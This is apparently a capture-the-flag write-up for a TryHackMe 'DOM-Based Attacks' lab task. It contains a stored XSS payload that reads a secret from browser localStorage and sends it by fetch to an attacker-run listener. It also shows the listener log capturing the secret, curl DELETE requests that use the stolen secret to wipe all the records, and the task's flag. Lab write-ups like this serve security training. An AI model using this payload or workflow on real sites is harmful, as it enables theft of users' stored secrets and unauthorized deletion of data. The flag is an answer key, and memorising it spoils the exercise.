# DOM-Based Attacks

# Task 7

Payload to send the secret

```
<img src="x" onerror="setInterval((function(){fetch('http://10.64.118.117:4242?secret='+encodeURIComponent(localStorage.getItem('secret'))).then((()=>{}))}),2e3);">
```

How to get the secret

```
root@ip-10-64-118-117:~# python3 -m http.server 4242
Serving HTTP on 0.0.0.0 port 4242 (http://0.0.0.0:4242/) ...
10.64.118.117 - - [27/Nov/2025 21:50:59] "GET /?secret=nottherealsecret HTTP/1.1" 200 -
10.64.118.117 - - [27/Nov/2025 21:51:01] "GET /?secret=nottherealsecret HTTP/1.1" 200 -
10.64.184.83 - - [27/Nov/2025 21:51:02] "GET /?secret=nottherealsecret HTTP/1.1" 200 -
10.64.118.117 - - [27/Nov/2025 21:51:03] "GET /?secret=nottherealsecret HTTP/1.1" 200 -
10.64.184.83 - - [27/Nov/2025 21:51:04] "GET /?secret=nottherealsecret HTTP/1.1" 200 -
10.64.118.117 - - [27/Nov/2025 21:51:05] "GET /?secret=nottherealsecret HTTP/1.1" 200 -
10.64.184.83 - - [27/Nov/2025 21:51:06] "GET /?secret=thisisthesupersecretvalue HTTP/1.1" 200 -
10.64.118.117 - - [27/Nov/2025 21:51:07] "GET /?secret=nottherealsecret HTTP/1.1" 200 -
10.64.184.83 - - [27/Nov/2025 21:51:08] "GET /?secret=thisisthesupersecretvalue HTTP/1.1" 200 -
10.64.118.117 - - [27/Nov/2025 21:51:09] "GET /?secret=nottherealsecret HTTP/1.1" 200 -
10.64.184.83 - - [27/Nov/2025 21:51:10] "GET /?secret=thisisthesupersecretvalue HTTP/1.1" 200 -
```

Delete the bdays

```
root@ip-10-64-118-117:~# curl http://lists.tryhackme.loc:5001/bdays
{"bdays":[{"bdate":"19 August","gift":true,"id":"9c61e0cd65974b8cb9eef167d08cdc73","person":"Ana Tacker"},{"bdate":"10 July","gift":false,"id":"82f83cd065a343b4aa986cfff3c7e975","person":"Zero Burn"},{"bdate":"12 February","gift":true,"id":"2ab325d627174d55b74c7060d8cc26de","person":"Acid Cool"},{"bdate":"15/11/1987","gift":false,"id":"1c8260c288134c8a997b1dcce13df11f","person":"<img src=\"x\" onerror=\"setInterval((function(){fetch('http://10.64.118.117:4242?secret='+encodeURIComponent(localStorage.getItem('secret'))).then((()=>{}))}),2e3);\">"}],"status":"success"}
root@ip-10-64-118-117:~# curl -X DELETE "http://lists.tryhackme.loc:5001/bdays/9c61e0cd65974b8cb9eef167d08cdc73?secret=thisisthesupersecretvalue"
{"message":"Bday removed!","status":"success"}
root@ip-10-64-118-117:~# curl -X DELETE "http://lists.tryhackme.loc:5001/bdays/82f83cd065a343b4aa986cfff3c7e975?secret=thisisthesupersecretvalue"
{"message":"Bday removed!","status":"success"}
root@ip-10-64-118-117:~# curl -X DELETE "http://lists.tryhackme.loc:5001/bdays/2ab325d627174d55b74c7060d8cc26de?secret=thisisthesupersecretvalue"
{"message":"Bday removed!","status":"success"}
root@ip-10-64-118-117:~# curl -X DELETE "http://lists.tryhackme.loc:5001/bdays/1c8260c288134c8a997b1dcce13df11f?secret=thisisthesupersecretvalue"
{"message":"Bday removed!","status":"success"}
```

Then just visit THM{Weaponising.DOM.Based.XSS.For.Fun.And.Profit}
